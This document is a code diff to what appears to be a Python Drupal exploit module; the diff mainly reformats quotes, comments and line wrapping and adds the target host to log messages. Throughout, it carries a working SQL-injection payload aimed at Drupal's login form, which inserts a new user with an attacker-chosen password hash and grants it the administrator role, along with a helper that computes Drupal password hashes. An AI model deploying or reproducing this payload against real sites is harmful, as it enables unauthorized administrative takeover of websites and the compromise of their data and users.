@@ -6,6 +6,7 @@ import requests
 import random
 
 import logging
+
 log = logging.getLogger(__name__)
 
 
@@ -38,8 +39,8 @@ class DrupalHash:
         else:
             return False
 
-        salt = bytes(setting[4:12], 'utf-8')
-        password = bytes(password, 'utf-8')
+        salt = bytes(setting[4:12], "utf-8")
+        password = bytes(password, "utf-8")
         hash_str = hash_func(salt + password).digest()
         for c in range(count):
             hash_str = hash_func(hash_str + password).digest()
@@ -54,19 +55,19 @@ class DrupalHash:
         itoa64 = self.itoa64
         while 1:
             value = string[i]
-            #value = ord(string[i])
+            # value = ord(string[i])
             i += 1
             output += itoa64[value & 0x3F]
             if i < count:
                 value |= string[i] << 8
-                #value |= ord(string[i]) << 8
+                # value |= ord(string[i]) << 8
             output += itoa64[(value >> 6) & 0x3F]
             if i >= count:
                 break
             i += 1
             if i < count:
                 value |= string[i] << 16
-                #value |= ord(string[i]) << 16
+                # value |= ord(string[i]) << 16
             output += itoa64[(value >> 12) & 0x3F]
             if i >= count:
                 break
@@ -132,26 +133,31 @@ class Drupal:
         # Set administrator permission (rid = 3):
         # insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
         #
-        payload = f'name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27{self.__user}%27,+%27{self.__hash[:55]}%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27{self.__user}%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in'
+        payload = f"name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27{self.__user}%27,+%27{self.__hash[:55]}%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27{self.__user}%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
 
+        log.debug(f"[!] Starting Drupal exploit ({self.__host})")
         try:
-            r = self.__requests.post(self.__target, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
+            r = self.__requests.post(
+                self.__target,
+                data=payload,
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+            )
             if "mb_strlen() expects parameter 1" in r.text:
-                log.info("[!] Drupal is vulnerable!")
+                log.info(f"[!] Drupal is vulnerable! ({self.__host})")
                 return True
             else:
-                log.info("[X] Exploit failed for some reason")
+                log.info(f"[X] Exploit failed for some reason ({self.__host})")
                 return False
         except requests.HTTPError as e:
-            log.info(f"[X] HTTP Error: {e.reason} ({e.code})")
+            log.info(f"[X] HTTP Error: {e.reason} ({e.code}) ({self.__host})")
             return True
         except requests.URLError as e:
-            log.info(f"[X] Connection error: {e.reason}")
+            log.info(f"[X] Connection error: {e.reason} ({self.__host})")
             return True
         except requests.ConnectTimeout as e:
-            log.info(f"[X] Connection timed out: {e.reason}")
+            log.info(f"[X] Connection timed out: {e.reason} ({self.__host})")
         except Exception as e:
-            log.info(f"[X] Exception: {e}")
+            log.info(f"[X] Exception: {e} ({self.__host})")
 
     def run(self, host, port=None, username=None, pwd=None):
         self.__host = host
